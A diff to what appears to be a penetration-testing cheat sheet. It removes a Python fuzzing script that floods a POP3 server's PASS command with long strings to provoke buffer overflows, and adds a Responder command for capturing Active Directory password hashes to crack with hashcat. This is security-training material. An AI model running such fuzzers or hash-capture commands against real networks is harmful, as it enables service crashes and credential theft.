@@ -1103,27 +1103,13 @@ firefox https://127.0.0.1:9392
 
 Add new target -> add new scan using target -> run
 
-# Buffer Overflows
+# Active Directory Pentesting
 
-## Fuzzing
-Fuzz base on buffer length and perhaps different characters, check for crashes, and observe memory stack in debugger.
+## Collecting Hashes with Responder
+Collect hashes with responder to later crack with hashcat.
 
-```py
-#!/usr/bin/env python
-
-import socket
-string = 'A'
-
-for i in range(100, 10000, 200):
-    print 'Fuzzing PASS with {} bytes'.format(i)
-    s = socket.socket()
-    s.connect(('192.168.1.23', 110))
-    s.recv(1024)
-    s.send('USER test\r\n')
-    s.recv(1024)
-    s.send('PASS {}\r\n'.format(string * i))
-    s.send('QUIT\r\n')
-    s.close()
+```
+responder -I tun0 -rdw -v
 ```
 
 # Win32 Buffer Overflows
